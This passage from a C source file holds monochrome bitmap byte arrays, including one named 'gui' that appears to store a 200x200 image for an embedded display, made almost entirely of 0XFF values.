0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,};


const unsigned char gui[5000] = { /* 0X01,0X01,0XC8,0X00,0XC8,0X00, */
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X3F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X7C,0X7C,0X7F,0XFF,0XFF,0XFF,
0XE0,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XE3,0X8F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X3C,0X38,0X7F,0XFF,
0XFF,0XFF,0XE1,0X8F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XE0,0X0F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X7C,0X3C,0X38,
0X7F,0XFF,0XFF,0XFF,0XF0,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X7C,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XF8,0X3F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X7C,
0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0XF0,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X7C,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,
0XC0,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0XFF,0XFF,0XFF,0XFF,
0XC1,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XF8,0X00,0X1F,0XFF,0XFF,0XFF,0XC3,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,
0XFF,0XFF,0X07,0XE0,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X07,0XFF,
0XFF,0XFF,0X87,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0X1F,0XF8,0X7F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X01,0XFF,0XFF,0XFF,0X87,0XFC,0X3C,0X38,0X7F,
0XFF,0XFF,0XFF,0XFE,0X1F,0XFC,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X03,0XFF,
0X80,0XFF,0XFF,0XFF,0X87,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XFE,0X3F,0XFC,0X7F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X0F,0XFF,0XF0,0X3F,0XFF,0XFF,0X87,0XFC,0X3C,
0X38,0X7F,0XFF,0XFF,0XFF,0XFE,0X3F,0XFC,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,
0X3F,0XFF,0XF8,0X1F,0XFF,0XFF,0XC3,0XF8,0X7C,0X38,0X7F,0XFF,0XFF,0XFF,0XFE,0X3F,
0XFC,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0XFF,0XFF,0XFE,0X0F,0XFF,0XFF,0XC3,
0XF8,0X7C,0X38,0X7F,0XFF,0XFF,0XFF,0XFE,0X1F,0XF8,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0X81,0XFF,0XFF,0XFF,0X0F,0XFF,0XFF,0XE0,0XE0,0XFC,0X38,0X7F,0XFF,0XFF,0XFF,
0XFF,0X0F,0XF0,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X07,0XFF,0XFF,0XFF,0X87,0XFF,
0XFF,0XE0,0X00,0XFC,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0X8F,0XF0,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFC,0X0F,0XFF,0XFF,0XFF,0XC3,0XFF,0XFF,0XF0,0X01,0XFC,0X38,0X7F,0XFF,
0XFF,0XFF,0XFF,0XDF,0XF9,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X3F,0X03,0XFF,0XE3,
0XC3,0XFF,0XFF,0XFC,0X07,0XFC,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XE0,0X7E,0X01,0XFF,0XC3,0XE1,0XFF,0XFF,0XFF,0XFF,0XFC,0X38,
0X7F,0X87,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X87,0XFF,0XFF,0XFF,0XC0,0XFC,0X01,
0XFF,0X83,0XE1,0XFF,0XFF,0XFF,0XFF,0XFC,0X38,0X7F,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFC,0X01,0XFF,0XFF,0XFF,0X81,0XFC,0X30,0XFF,0X07,0XF0,0XFF,0XFF,0XFF,0XFF,
0XFC,0X38,0X7F,0X80,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X7F,0XFF,0XFE,0X07,
0XFC,0X70,0XFE,0X0F,0XF0,0XFF,0XFF,0XFF,0XFF,0XFC,0X38,0X7F,0XC0,0X7F,0XFF,0XFF,
0X80,0X00,0X00,0X20,0X20,0X3F,0XFF,0XFC,0X0F,0XFC,0X70,0XFC,0X1F,0XF0,0XFF,0XFF,
0XFC,0X3F,0XFC,0X38,0X7F,0XF0,0X7F,0XFF,0XFC,0X00,0X00,0X00,0X01,0XFC,0X1F,0XFF,
0XF8,0X3F,0XFC,0X20,0XF8,0X3F,0XF8,0X7F,0XFF,0XF0,0X1F,0XFC,0X38,0X7F,0XF8,0X3F,
0XFF,0XF8,0X00,0X00,0X00,0X03,0XFE,0X1F,0XFF,0XE0,0X7F,0XFC,0X01,0XF0,0X7F,0XF8,
0X7F,0XFF,0XC0,0X3F,0XFC,0X38,0X7F,0XFC,0X1F,0XFF,0XF0,0X00,0X00,0X00,0X07,0XDF,
0X0F,0XFF,0XC0,0XFF,0XFE,0X01,0XE0,0XFF,0XF8,0X7F,0XFF,0X80,0X7F,0XFC,0X38,0X7F,
0XFE,0X1F,0XFF,0XF0,0XFF,0XFF,0XFF,0XFF,0X07,0X8F,0XFF,0X03,0XFF,0XFF,0X07,0XC1,
0XFF,0XF8,0X7F,0XFF,0X03,0XFF,0XFC,0X38,0X7F,0XFE,0X1F,0XFF,0XE1,0XFF,0XFF,0XFF,
0XFE,0X03,0X87,0XFF,0X03,0XFF,0XFF,0XFF,0X83,0XE3,0XF8,0X7F,0XFE,0X0F,0XFF,0XFC,
0X38,0X7F,0XFF,0X1F,0XFF,0XE3,0XFF,0XC0,0X00,0X00,0X03,0X87,0XFF,0X81,0XFF,0XFF,
0XFF,0X07,0X80,0XF8,0X7F,0XFC,0X1F,0XFF,0XFC,0X38,0X7F,0XFF,0X1F,0XFF,0XE3,0XFF,
0XC0,0X00,0X00,0X03,0X87,0XFF,0XC0,0X7F,0XFF,0XFE,0X0F,0X00,0X78,0X7F,0XFC,0X3F,
0XFF,0XFC,0X38,0X7F,0XFF,0X1F,0XFF,0XE1,0XFF,0XE0,0X00,0X00,0X03,0X87,0XFF,0XF0,
0X3F,0XFF,0XFC,0X1F,0X00,0X78,0X7F,0XF8,0X7F,0XFF,0XFC,0X38,0X7F,0XFE,0X1F,0XFF,
0XF1,0XFF,0XFF,0XFF,0XFF,0X03,0X87,0XFF,0XF8,0X1F,0XFF,0XF8,0X3E,0X1C,0X38,0XFF,
0XF8,0X7F,0XFF,0XFC,0X3C,0X3F,0XFE,0X1F,0XFF,0XF0,0X7F,0XFF,0XFF,0XFF,0X8F,0X8F,
0XFF,0XFE,0X07,0XFF,0XF0,0X7E,0X1C,0X30,0XFF,0XF8,0XFF,0XFF,0XFC,0X3C,0X3F,0XFE,
0X1F,0XFF,0XF8,0X00,0X00,0X00,0X03,0XFF,0X0F,0XFF,0XFF,0X03,0XFF,0XE0,0XFE,0X1C,
0X30,0XFF,0XF0,0XFF,0XFF,0XFC,0X3C,0X1F,0XFC,0X3F,0XFF,0XFC,0X00,0X00,0X00,0X01,
0XFE,0X1F,0XFF,0XFF,0XC1,0XFF,0XC1,0XFF,0X00,0X71,0XFF,0XF0,0XFF,0XFF,0XFC,0X3E,
0X0F,0XF8,0X3F,0XFF,0XFF,0X00,0X00,0X00,0X00,0X78,0X3F,0XFF,0XFF,0XE0,0X7F,0X83,
0XFF,0X00,0X61,0XFF,0XF0,0XFF,0XFF,0XFC,0X3F,0X07,0XE0,0X7F,0XFF,0XFF,0X8F,0XE3,
0XF8,0XF0,0X00,0X7F,0XFF,0XFF,0XF0,0X3F,0X87,0XFF,0X80,0XE1,0XFF,0XF0,0XFF,0XFF,
0XFC,0X7F,0X80,0X00,0XFF,0XFF,0XFF,0X8F,0XE3,0XF8,0XFC,0X00,0XFF,0XFF,0XFF,0XF8,
0X1F,0XCF,0XFF,0XE3,0XC3,0XFF,0XF0,0XFF,0XFF,0XFC,0X7F,0XC0,0X01,0XFF,0XFF,0XFF,
0X8F,0XE3,0XF8,0XFF,0X03,0XFF,0XFF,0XFF,0XFE,0X07,0XFF,0XFF,0XFF,0X87,0XFF,0XF0,
0XFF,0XFF,0XFC,0X7F,0XF0,0X07,0XFF,0XFF,0XFF,0X8F,0XE3,0XFD,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X03,0XFF,0XFF,0XFF,0X07,0XFF,0XF0,0XFF,0XFF,0XF8,0X7F,0XFE,0X3F,0XFF,
0XFF,0XFF,0X8F,0XE3,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0XFF,0XFF,0XFE,0X0F,
0XFF,0XF8,0XFF,0XFF,0XF8,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0X8F,0XF7,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XE0,0X7F,0XFF,0XFC,0X1F,0XFF,0XF8,0X7F,0XFF,0XF8,0X7F,0XFF,
0XFF,0XFF,0XFF,0XFF,0X8F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X1F,0XFF,
0XF0,0X3F,0XFF,0XF8,0X7F,0XFF,0XF0,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X07,0XFF,0XC0,0X7F,0XFF,0XFC,0X3F,0XFF,0XE0,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,
0X00,0XFE,0X00,0XFF,0XFF,0XFC,0X1F,0XFF,0XC1,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X03,0XFF,0XFF,0XFE,0X0F,
0XFF,0X83,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XF0,0X00,0X0F,0XFF,0XFF,0XFF,0X03,0XFE,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X7F,0XFF,0XFF,
0XFF,0X80,0X30,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X1F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XF0,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X01,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
